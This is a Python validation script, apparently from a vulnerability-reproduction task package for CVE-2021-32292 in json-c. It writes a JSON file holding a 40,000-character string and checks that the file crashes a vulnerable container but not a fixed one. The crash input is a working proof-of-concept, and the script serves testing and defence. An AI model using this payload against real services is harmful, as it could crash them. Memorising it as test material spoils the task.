import subprocess
import os
import sys

def generate_poc():
    print("[*] Generating PoC (40KB flat string)...")
    payload = '{"key": "' + ("A" * 40000) + '"}'
    with open("manual_seed.json", "w") as f:
        f.write(payload)
    print(f"    Created manual_seed.json ({len(payload)} bytes)")

def run_target(service_name):
    print(f"[*] Testing {service_name}...")
    cmd = [
        "docker", "compose", 
        "-f", "tasks/CVE-2021-32292_jsonc/compose.yml",
        "run", "--rm", 
        "-v", f"{os.getcwd()}/manual_seed.json:/input/seed.bin",
        service_name
    ]
    
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    code = result.returncode
    
    icon = "❓"
    if code == 139: icon = "💥 CRASH"
    elif code == 0: icon = "✅ OK"
    elif code == 1: icon = "🛡️ HANDLED"
    
    print(f"    Exit Code: {code}  {icon}")
    return code

def main():
    generate_poc()
    
    print("\n--- STARTING VALIDATION ---")
    
    # Test Vulnerable (Expected: 139 or similar crash)
    c_vuln = run_target("target-vuln")
    
    # Test Fixed (Expected: 0 or 1)
    c_fixed = run_target("target-fixed")
    
    print("\n--- RESULTS ---")
    success = False
    
    if c_vuln == 139 and c_fixed != 139:
        print("SUCCESS! Vulnerable version crashed, Fixed version handled it.")
        success = True
    elif c_vuln != 139:
        print("FAIL: Vulnerable version did NOT crash (is the PoC correct?).")
    elif c_fixed == 139:
        print("FAIL: Fixed version also crashed (fix ineffective?).")
        
    if not success:
        sys.exit(1)

if __name__ == "__main__":
    main()
